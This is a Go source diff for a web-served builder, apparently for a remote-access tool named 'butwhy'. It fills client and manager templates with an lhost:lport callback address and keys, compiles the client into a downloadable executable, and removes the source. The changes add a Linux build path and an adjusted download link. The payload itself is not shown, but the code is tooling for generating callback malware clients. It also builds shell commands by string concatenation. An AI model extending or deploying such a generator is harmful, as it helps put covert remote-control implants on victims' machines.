@@ -178,10 +178,14 @@ func butyindex(httpw http.ResponseWriter, req *http.Request) {
 		updatetemplate("basefiles/butwhyclient.go", "download/butwhyclient.go", lhost+":"+lport, butyclientpvtkey, "")
 		buildexe("download/"+saveas+".exe", "download/butwhyclient.go")
 		updatetemplate("basefiles/butwhymanager.go", "download/butwhymanager.go", lport, "", butyclientpubkey)
-		buildexe("download/butymanager.exe", "download/butwhymanager.go")
+		buildmanger("download/butymanager", "download/butwhymanager.go")
 
 		time.Sleep(5000 * time.Millisecond)
-		dwnloadlink.Link = "download/" + saveas + ".exe"
+		if runtime.GOOS == "windows" {
+			dwnloadlink.Link = "download/" + saveas + ".exe"
+		} else {
+			dwnloadlink.Link = "download/" + saveas
+		}
 		os.Remove("download/butwhymanager.go")
 		os.Remove("download/butwhyclient.go")
 		err = butytemplate.Execute(httpw, dwnloadlink)
@@ -208,6 +212,35 @@ func startserver() {
 	srv.ListenAndServe()
 }
 
+func buildmanger(exepath string, gofilepath string) {
+	if runtime.GOOS == "linux" {
+		cmdpath, _ := exec.LookPath("bash")
+		execargs := "GOARCH=386 go build -o " + exepath + " " + gofilepath
+		fmt.Println(execargs)
+		cmd := exec.Command(cmdpath, "-c", execargs)
+		err := cmd.Start()
+		cmd.Wait()
+		if err != nil {
+			fmt.Println(err)
+		} else {
+			fmt.Println(exepath)
+			//fmt.Println(gofilepath)
+			fmt.Println("Build Success !")
+		}
+	} else {
+		cmd := exec.Command("go", "build", "-o", exepath+".exe", gofilepath)
+		err := cmd.Start()
+		cmd.Wait()
+		if err != nil {
+			fmt.Println(err)
+		} else {
+			fmt.Println(exepath)
+			//fmt.Println(gofilepath)
+			fmt.Println("Build Success !")
+		}
+	}
+}
+
 func buildexe(exepath string, gofilepath string) {
 	if runtime.GOOS == "linux" {
 		cmdpath, _ := exec.LookPath("bash")
@@ -224,7 +257,7 @@ func buildexe(exepath string, gofilepath string) {
 			fmt.Println("Build Success !")
 		}
 	} else {
-		cmd := exec.Command("go", "build", "-o", exepath, gofilepath)
+		cmd := exec.Command("go", "build", "-o", exepath+".exe", gofilepath)
 		err := cmd.Start()
 		cmd.Wait()
 		if err != nil {
